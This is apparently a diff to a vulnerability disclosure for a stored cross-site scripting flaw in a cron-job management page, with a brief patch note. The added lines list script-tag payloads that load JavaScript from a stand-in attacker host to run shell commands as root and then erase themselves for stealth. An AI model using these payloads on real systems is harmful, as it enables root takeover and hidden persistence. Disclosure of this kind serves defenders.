@@ -36,8 +36,16 @@ I've created 2 examples on how you can escalate this attack to take control of t
 <script type="text/javascript" src="https://yourevilwebsite.tld/PayloadChangeRootPass.js"></script>
 ```
 
+3. <b>PayloadExecCmd.js</b> add this code as your cronjob, when the root user list the cronjobs, you will be able to execute any shell command as the root user, you can create a new user with root privileges for examples ;)
+``` 
+<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadExecCmd.js"></script>
+```
+4. <b>PayloadRemoveCron.js</b> add this code as your cronjob, when the root user list the cronjobs, the malicious code will be removed automatically from the cronjob's list. you can conbine this code wity any of the other codes to execute whatever you want and delete the XSS payload to be more stealthy.
+``` 
+<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadRemoveCron.js"></script>
+```
 
-3. You can perform any action you want as the root user. The only limit is your imagination....
+5. You can perform any action you want as the root user. The only limit is your imagination....
 
 #  Solution - Fix & Patch
 The vulnerability can be patched by a secure parse and encode of the vulnerable input fields.
